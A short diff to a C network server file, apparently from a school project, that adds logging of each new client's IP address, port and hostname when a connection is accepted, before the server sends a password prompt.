@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/08/14 01:43:07 by root             ###   ########.fr       */
+/*   Updated: 2018/08/17 19:51:50 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,6 +14,8 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
+/* inet_ntop */
+#include <arpa/inet.h>
 
 #include "main.h"
 #include "durex.h"
@@ -85,8 +87,13 @@ void					serverAcceptConnections()
 		if (e.server.client[i].fd == -1) {
 			clearClient(&e.server.client[i]);
 			e.server.client[i].fd = fd;
+			getnameinfo(&csin, sizeof(csin), e.server.client[i].host, NI_MAXHOST,
+						e.server.client[i].port, NI_MAXSERV, NI_NUMERICSERV);
+			inet_ntop(AF_INET, &((struct sockaddr_in *)&csin)->sin_addr.s_addr,
+					  e.server.client[i].addr, sizeof(e.server.client[i].addr));
+			serverLog("[LOGS] - New connection from %s:%s (%s)", e.server.client[i].addr,
+					  e.server.client[i].port, e.server.client[i].host);
 			clientWrite("Pass: ", &e.server.client[i]);
-			serverLog("[LOGS] - New client %d", fd);
 			return ;
 		}
 	}
